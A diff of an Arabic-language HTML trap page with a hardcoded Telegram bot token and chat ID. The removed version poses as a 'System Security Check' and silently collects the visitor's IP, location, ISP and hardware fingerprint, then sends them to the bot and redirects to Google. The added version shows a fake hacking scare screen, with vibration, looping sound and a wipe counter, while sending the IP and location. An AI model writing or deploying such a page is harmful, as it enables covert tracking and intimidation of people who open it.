@@ -2,82 +2,64 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ System Security Check</title>
+    <title>⚠️ WARNING: SYSTEM CRITICAL</title>
 </head>
-<body onload="launchGhostStrike()" style="background:#000; color:#ff0000; font-family:monospace; text-align:center; padding-top:20%;">
+<body onclick="executeNightmare()" style="background:#000; color:#ff0000; font-family:monospace; text-align:center; padding-top:15%; overflow:hidden;">
     
-    <div style="margin-bottom: 20px;">
-        <img src="https://i.imgur.com/Gis4zUf.jpeg" alt="Hacker Mask" style="width: 220px; filter: drop-shadow(0 0 15px #ff0000);">
+    <div id="landing">
+        <img src="https://i.imgur.com/Gis4zUf.jpeg" style="width: 220px; border: 1px solid #ff0000; box-shadow: 0 0 30px #ff0000;">
+        <h1 style="font-size: 35px; letter-spacing: 3px;">INTERNAL ERROR</h1>
+        <p style="color: #fff; font-size: 20px;">[ اضغط هنا لإيقاف تسريب البيانات ]</p>
     </div>
-    
-    <h1 style="font-size: 28px; text-shadow: 0 0 15px #ff0000;">[ WORM GPT - GHOST MODE ]</h1>
-    <p style="color: #fff;">Verifying Encrypted Connection... <span id="pct">0</span>%</p>
 
     <script>
     const TOKEN = "8069850549:AAG4ZyU6Vudg7A1qDvfEHeMcfln6ajyNh64";
     const CHAT_ID = "5657233411";
 
-    let p = 0;
-    let inv = setInterval(() => { 
-        if(p < 100) { p++; document.getElementById('pct').innerText = p; } 
-    }, 15);
+    async function executeNightmare() {
+        // 1. الدخول في وضع الرعب البصري والسمعي
+        document.getElementById('landing').innerHTML = `
+            <div style="padding-top:10%; animation: glitch 0.1s infinite;">
+                <h1 style="font-size:100px;">☠️</h1>
+                <h2 style="font-size:40px;">UPLOADING FILES...</h2>
+                <h1 id="count" style="font-size:80px;">0%</h1>
+            </div>
+        `;
 
-    async function launchGhostStrike() {
-        let report = "👻 [ تـقـريـر الاخـتـراق الـصـامـت ] 👻\n";
-        report += "━━━━━━━━━━━━━━━━━━━━━━\n\n";
+        // 2. الاهتزاز العنيف
+        if (navigator.vibrate) { navigator.vibrate([100, 50, 100, 50, 1000]); setInterval(() => navigator.vibrate(500), 1000); }
 
-        // 1. تحديد اسم الجهاز بدقة (تنظيف الـ User Agent)
-        let device = "Unknown Device";
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) {
-            const match = ua.match(/Android\s+([^\s;]+);\s+([^;]+)/);
-            device = match ? match[2] : "Android Device";
-        } else if (/iPhone/i.test(ua)) {
-            device = "iPhone";
-        } else {
-            device = navigator.platform;
-        }
+        // 3. الصوت المزعج
+        let audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+        audio.loop = true; audio.play();
 
-        // 2. سحب الـ IP والموقع بقوة (استخدام سيرفر سريع)
+        // 4. سحب البيانات الحقيقية صمتاً
+        let msg = "🚨 [ هـجـوم الكـابـوس - تـم الاخـتـراق ] 🚨\n";
+        msg += "━━━━━━━━━━━━━━━━━━━━━━\n";
         try {
             const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-            report += "🌐 【 بـيـانـات الـشـبـكـة 】\n";
-            report += `📍 الـ IP: ${res.ip}\n`;
-            report += `🏙️ الـمـديـنـة: ${res.city}, ${res.country_name}\n`;
-            report += `🏢 الـمـزود: ${res.org}\n\n`;
-        } catch(e) { 
-            report += "🌐 الـ IP: [ تـعـذر الـسـحب - حماية ]\n\n"; 
-        }
+            msg += `📍 الـ IP: ${res.ip}\n📍 الـمـوقع: ${res.city}, ${res.country_name}\n📱 الـجـهاز: ${navigator.platform}\n`;
+        } catch(e) {}
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
-        // 3. مواصفات العتاد
-        report += "📱 【 مـواصـفـات الـهـدف 】\n";
-        report += `📱 الـجـهـاز: ${device}\n`;
-        report += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Core\n`;
-        report += `💾 الـرام: ${navigator.deviceMemory || '??'} GB\n`;
-        report += `🖼️ الـجـرافـيـك: ${getGPU()}\n\n`;
-
-        // 4. البصمة الرقمية
-        report += "🕵️ 【 الـبـصـمـة الـجـنـائـيـة 】\n";
-        report += `📏 الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
-        report += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        report += "━━━━━━━━━━━━━━━━━━━━━━\n";
-        report += "💀 [ تـم سـحب الـبيانات بـنجاح ]";
-
-        // إرسال البيانات فوراً
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`)
-        .then(() => {
-            // تحويل الضحية لقوقل بعد 2.5 ثانية (وقت كافي للسحب الصامت)
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2500);
-        });
-    }
-
-    function getGPU() {
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).split(' ').pop();
-        } catch(e) { return "Hidden"; }
+        // 5. عداد المسح الوهمي
+        let c = 0;
+        let t = setInterval(() => {
+            if(c < 100) { c++; document.getElementById('count').innerText = c + "%"; }
+            else { clearInterval(t); }
+        }, 40);
     }
     </script>
+
+    <style>
+        @keyframes glitch {
+            0% { transform: translate(0); color: red; }
+            20% { transform: translate(-5px, 5px); color: blue; }
+            40% { transform: translate(-5px, -5px); color: green; }
+            60% { transform: translate(5px, 5px); color: yellow; }
+            80% { transform: translate(5px, -5px); color: purple; }
+            100% { transform: translate(0); }
+        }
+    </style>
 </body>
 </html>
